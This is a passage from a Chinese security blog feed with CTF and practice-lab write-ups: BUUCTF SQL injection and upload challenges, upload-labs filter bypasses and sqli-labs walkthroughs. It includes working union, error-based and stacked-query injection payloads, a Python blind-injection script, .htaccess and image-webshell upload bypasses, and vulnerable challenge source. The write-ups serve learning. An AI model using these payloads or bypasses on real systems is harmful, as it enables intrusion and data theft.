title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>抓包发现有被注释的编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br></pre></td></tr></table></figure><p>先用<code>base32</code>解码，再用<code>base64</code>解码得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure><p>尝试后发现<code>(</code>、<code>)</code>、<code>or</code>和<code>=</code>被禁用，构造post请求</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#url</span><br><span class="line">http://e4108c0f-ff96-443a-943e-fe487fdd84a4.node4.buuoj.cn:81/search.php</span><br><span class="line">#data</span><br><span class="line">name=a&#x27;union select &#x27;1&#x27;,&#x27;admin&#x27;,&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;%23&amp;pw=3</span><br></pre></td></tr></table></figure><blockquote><p>利用sqli的特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</p></blockquote><p>题目源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">function stripslashes_deep($value)</span><br><span class="line">&#123;</span><br><span class="line">$value = is_array($value) ?</span><br><span class="line">array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">stripslashes($value);</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">// echo $sql;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">$arr = mysqli_fetch_row($result);</span><br><span class="line">// print_r($arr);</span><br><span class="line">if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">if(md5($password) == $arr[2])&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;wrong pass!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;wrong user!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/m0_46246804/article/details/109128549">[GXYCTF2019]BabySQli 解题思路&amp;过程</a></p><p><a href="https://blog.csdn.net/satasun/article/details/107180524">[GXYCTF2019]BabySQli</a></p></blockquote><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>尝试注入后发现有报错，禁用了一些关键词</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>进行注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆出数据库名supersqli</span><br><span class="line">/?inject=1&#x27;and extractvalue(1,concat(0x7e,database()))%23</span><br><span class="line">#爆表名FlagHere,words</span><br><span class="line">/?inject=-1&#x27;;show tables;%23</span><br><span class="line">#爆列（发现有名称flag）</span><br><span class="line">/?inject=-1&#x27;;show columns from FlagHere;%23</span><br><span class="line">#获取flag</span><br><span class="line">/?inject=-1&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;%23</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://blog.csdn.net/weixin_52268949/article/details/122707006">[GYCTF2020]Blacklist</a></p></blockquote><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>采用<code>.htaccess绕过</code>即可，参考本人博客<a href="https://www.evo1ution.cn/2022/05/27/upload-labs/">upload-labs</a>中<code>pass-04</code>即可上传成功。上传后用蚁剑连接，在根目录下即可找到flag。</p><blockquote><p>注意：连接时找准两个文件所在同一目录</p></blockquote><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>盲注，<code>exp</code>如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://6b9ef1c1-f0eb-4837-968c-06daba8e0f0c.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r = <span class="number">130</span></span><br><span class="line">    mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        <span class="comment"># print(l,r,mid)</span></span><br><span class="line">        payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)  <span class="comment">#不设置延时会无法得到正确flag</span></span><br><span class="line">        response = requests.post(url,data=payload)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    res += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">if</span>(res[-<span class="number">1</span>]==<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><blockquote><p>**if(1&#x3D;1,1,2)**：类似三目运算符<code>1==1?1:2</code></p><p><strong>0^1</strong>：异或</p></blockquote><p>题目源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbuser</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    <span class="variable">$blackList</span> = <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;||&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&#x27;group&#x27;</span>,<span class="string">&#x27;limit&#x27;</span>,<span class="string">&#x27;update&#x27;</span>,<span class="string">&#x27;delete&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;load_file&#x27;</span>,<span class="string">&#x27;outfile&#x27;</span>,<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blackList</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$sql</span>,<span class="variable">$blackitem</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$db</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;   </span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;ctf&quot;</span>,<span class="variable">$db</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">safe</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$query</span>)&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$query</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;SQL Injection Checked.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs 刷题记录</title>
      <link href="/2022/05/27/upload-labs/"/>
      <url>/2022/05/27/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs-刷题记录"><a href="#upload-labs-刷题记录" class="headerlink" title="upload-labs 刷题记录"></a>upload-labs 刷题记录</h1><blockquote><p>参考：</p><p><a href="https://mh-nexus.de/en/hxd/">HxD</a></p><p><a href="https://xz.aliyun.com/t/2657#toc-13">upload-labs之pass 16详细分析</a></p><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a></p></blockquote><h2 id="Pass-01-js检查"><a href="#Pass-01-js检查" class="headerlink" title="Pass-01 js检查"></a>Pass-01 js检查</h2><p>前端验证图片格式，禁用<code>js</code>或者使用<code>burp</code>抓包修改后缀即可。</p><p><img src="https://img.gejiba.com/images/be4d8b59f055d5ad042387525c54bfa2.png" alt="be4d8b59f055d5ad042387525c54bfa2.png"></p><p>访问<code>http://127.0.0.1:8081/upload-labs/upload/phpinfo.php</code>即可查看信息。</p><h2 id="Pass-02-只验证content-type"><a href="#Pass-02-只验证content-type" class="headerlink" title="Pass-02 只验证content-type"></a>Pass-02 只验证content-type</h2><p>只验证了<code>content-type</code>类型，抓包修改即可</p><p><img src="https://img.gejiba.com/images/3bf4033c5b0d71b5c70903f7e787b8bb.png" alt="3bf4033c5b0d71b5c70903f7e787b8bb.png"></p><h2 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h2><p>采用黑名单机制，不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀的文件，但可以上传<code>.phtml .phps .php5 .pht</code>，前提是<code>apache</code>的<code>httpd.conf</code>中有如下配置代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p>上传后注意关注下文件存储位置和文件名</p><p><img src="https://img.gejiba.com/images/dc38b78d98fa42a507712c6e224bae50.png" alt="dc38b78d98fa42a507712c6e224bae50.png"></p><h2 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04 .htaccess绕过"></a>Pass-04 .htaccess绕过</h2><p>禁止了一系列文件类型，但没有禁止<code>.htaccess</code>，不过该方法需要<code>mod_rewrite</code>模块开启且<code>AllowOverride All</code>。</p><p>上传一个<code>.htaccess</code>文件，内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><img src="https://img.gejiba.com/images/ba4a58067b6876052721825a87ac6fa2.png" alt="ba4a58067b6876052721825a87ac6fa2.png"></p><p>这样所有文件都会当成php文件来解析，所以此时再上传<code>phpinfo.jpg</code>并访问即可。</p><h2 id="Pass-05-点空格点绕过"><a href="#Pass-05-点空格点绕过" class="headerlink" title="Pass-05 点空格点绕过"></a>Pass-05 点空格点绕过</h2><p>后缀修改为<code>.php. .</code></p><h2 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06 大小写绕过"></a>Pass-06 大小写绕过</h2><p>修改文件后缀为<code>.PHP</code>即可</p><h2 id="Pass-07-空格绕过"><a href="#Pass-07-空格绕过" class="headerlink" title="Pass-07 空格绕过"></a>Pass-07 空格绕过</h2><p>后缀最后加空格即可</p><h2 id="Pass-08-点绕过"><a href="#Pass-08-点绕过" class="headerlink" title="Pass-08 点绕过"></a>Pass-08 点绕过</h2><p>后缀加点即可<code>.php.</code></p><h2 id="Pass-09-DATA绕过"><a href="#Pass-09-DATA绕过" class="headerlink" title="Pass-09 ::$DATA绕过"></a>Pass-09 ::$DATA绕过</h2><p>在后缀加<code>::$DATA</code>即可</p><h2 id="Pass-10-点空格点绕过"><a href="#Pass-10-点空格点绕过" class="headerlink" title="Pass-10 点空格点绕过"></a>Pass-10 点空格点绕过</h2><p>同<code>Pass-05</code></p><h2 id="Pass-11-双写绕过"><a href="#Pass-11-双写绕过" class="headerlink" title="Pass-11 双写绕过"></a>Pass-11 双写绕过</h2><p>后缀改为<code>.pphphp</code></p><h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 %00截断"></a>Pass-12 %00截断</h2><p>抓包修改<code>save_path</code>参数</p><blockquote><p>php版本要小于5.3.4且magic_quotes_gpc为OFF状态</p></blockquote><h2 id="Pass-13-0x00截断"><a href="#Pass-13-0x00截断" class="headerlink" title="Pass-13 0x00截断"></a>Pass-13 0x00截断</h2><p>同<code>Pass-12</code>，只不过这里路径是POST请求，所以要抓包后修改Hex</p><h2 id="Pass-14-文件头检测"><a href="#Pass-14-文件头检测" class="headerlink" title="Pass-14 文件头检测"></a>Pass-14 文件头检测</h2><p>可以直接用<code>copy 14.jpg /b + 14.php /a webshell.jpg</code>生成图片马，然后直接上传。</p><p>上传后使用自带的<code>include.php</code>读取即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/upload-labs/include.php?file=./upload/6220220527081735.png</span><br></pre></td></tr></table></figure><h2 id="Pass-15-getimagesize检测"><a href="#Pass-15-getimagesize检测" class="headerlink" title="Pass-15 getimagesize检测"></a>Pass-15 getimagesize检测</h2><p>同<code>Pass-14</code></p><blockquote><p>getimagesize函数：对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</p></blockquote><h2 id="Pass-16-exif-imagetype检测"><a href="#Pass-16-exif-imagetype检测" class="headerlink" title="Pass-16 exif_imagetype检测"></a>Pass-16 exif_imagetype检测</h2><p>同<code>Pass14</code>，但要打开<code>php_exif</code></p><blockquote><p>exif_imagetype函数：读取一个图像的第一个字节并检查其签名</p></blockquote><h2 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17 二次渲染"></a>Pass-17 二次渲染</h2><p>用<a href="https://mh-nexus.de/en/hxd/">HxD</a>查看上传前后文件差异，看看哪个部分没有被修改，将php代码放到没有被更改的部分即可。</p><p>详细操作可见<a href="https://xz.aliyun.com/t/2657#toc-13">upload-labs之pass 16详细分析</a></p><blockquote><p>imagecreatefromjpeg函数：用于从JPEG文件或URL创建新图像，在此过程中可能会有信息丢失（如植入的php代码）</p></blockquote><h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18 条件竞争"></a>Pass-18 条件竞争</h2><p>审计源码，发现后端是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果我们在上传后但未验证的这一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。</p><p>用<code>burp</code>的<code>intruder</code>模块不停发送请求，然后不断刷新页面访问直到成功。</p><h2 id="Pass-19-后缀判断-二次渲染-条件竞争"><a href="#Pass-19-后缀判断-二次渲染-条件竞争" class="headerlink" title="Pass-19 后缀判断+二次渲染+条件竞争"></a>Pass-19 后缀判断+二次渲染+条件竞争</h2><p>上传图片马配合文件包含漏洞即可，其他同<code>Pass-18</code>。</p><h2 id="Pass-20-x2F-绕过"><a href="#Pass-20-x2F-绕过" class="headerlink" title="Pass-20 &#x2F;.绕过"></a>Pass-20 &#x2F;.绕过</h2><p><img src="https://img.gejiba.com/images/8b13cd552ce4213d4e01abcd454d87cc.png" alt="8b13cd552ce4213d4e01abcd454d87cc.png"></p><blockquote><p>move_uploaded_file()特性之一：忽略掉文件末尾的 &#x2F;.</p></blockquote><h2 id="Pass-21-数组绕过"><a href="#Pass-21-数组绕过" class="headerlink" title="Pass-21 数组绕过"></a>Pass-21 数组绕过</h2><p><img src="https://img.gejiba.com/images/ac64dfb6954cf795497815163ebe8c23.png" alt="ac64dfb6954cf795497815163ebe8c23.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs 刷题记录</title>
      <link href="/2022/05/17/sqli-labs/"/>
      <url>/2022/05/17/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-刷题记录"><a href="#sqli-labs-刷题记录" class="headerlink" title="sqli-labs 刷题记录"></a>sqli-labs 刷题记录</h1><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/lcamry/category/846064.html">MYSQL注入天书</a></p></blockquote><p>此文尽量使用手工注入以加深对原理的理解，竭力避免了使用sqlmap或者脚本自动化注入等方式。</p><h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1 (Basic Challenges)"></a>Page-1 (Basic Challenges)</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String (基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String (基于错误的GET单引号字符型注入)</h3><h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><p>进去之后发现让输入id，随便输一个数字id发现都可以正常回显，然后尝试注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/M4r9ztPgwYUuNdL.png" alt="1_1.png"></p><p>根据报错信息猜测原语句是用<code>&#39;$id&#39;</code>来处理的输入，故用<code>&#39;</code>闭合即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/X1JuzWeRH5GcntV.png" alt="1_2.png"></p><p>正常回显，故用<code>order by</code>爆出列数，发现有3列(4时报错)</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">order</span> by <span class="number">4</span>--+</span><br></pre></td></tr></table></figure><p>然后开始爆库名</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/639kfQjuw8qMStc.png" alt="1_3.png"></p><p>发现<code>security</code>数据库，开始爆表名</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/YLH869CSsQAWbE5.png" alt="1_4.png"></p><p>爆<code>users</code>表里的列名</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/fbgWAv5Ir68DTdY.png" alt="1_5.png"></p><p>爆出表里的所有数据</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/Uc5l39PbvWEoXCG.png" alt="1_6.png"></p><p>很好，我们终于达到了和不断直接输入<code>?id=xxxxx</code>相同的效果hhh😄</p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>把传入的<code>$id</code>直接当作字符串拼接了进来，故只需要用<code>&#39;</code>闭合掉前面的引号，然后用<code>--+</code>注释掉后面的语句即可完成注入</p><h3 id="Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><h4 id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h4><p>输入<code>?id=1&#39;</code>观察报错</p><p><img src="https://s2.loli.net/2022/05/17/6cSxRIwZXdgPE1r.png" alt="2.png"></p><p>根据报错猜测是未用<code>&#39;&#39;</code>包裹<code>$id</code>，直接对输入进行拼接，故与less-1相比只需去掉数字后的<code>&#39;</code>即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#爆列数</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#爆库名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆数据</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看到直接把<code>$id</code>拼接了进来。</p><h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><h4 id="手动注入-2"><a href="#手动注入-2" class="headerlink" title="手动注入"></a>手动注入</h4><p>输入<code>?id=1&#39;</code>观察报错</p><p><img src="https://s2.loli.net/2022/05/17/SefyJM3Dud15Pk6.png" alt="3.png"></p><p>根据报错猜测原语句是<code>(&#39;$id&#39;)</code>，故只需用<code>&#39;)</code>来闭合即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)--+</span><br><span class="line"><span 